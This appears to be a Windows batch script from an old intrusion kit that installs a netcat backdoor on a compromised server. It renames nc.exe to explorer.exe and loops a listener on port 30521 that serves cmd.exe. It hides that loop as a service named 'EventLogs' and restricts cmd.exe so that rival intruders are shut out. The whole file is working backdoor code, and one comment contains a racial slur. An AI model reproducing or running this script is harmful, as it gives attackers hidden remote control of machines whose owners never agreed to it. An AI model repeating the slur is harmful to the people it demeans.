rem COREiSO Batch install. dont touch niggah, ass witches bite.
rem ::::::
rem Ok here we go, NC backdoor install
copy nc.exe c:\winnt\system32\explorer.exe
echo loop: >>c:\winnt\system32\boot.bat
echo explorer.exe -d -L -p 30521 -e cmd.exe>>c:\winnt\system32\boot.bat
echo goto loop >>c:\winnt\system32\boot.bat
services createsvrany "elog" "EventLogs" "c:\winnt\svchost.exe" "c:\winnt\system32\boot.bat"
services start elog
rem ok, now lets take out that nasty ass unicode.
xcacls c:\winnt\system32\cmd.exe /E /C /D GUESTS /Y
rem thats it, chicken grit.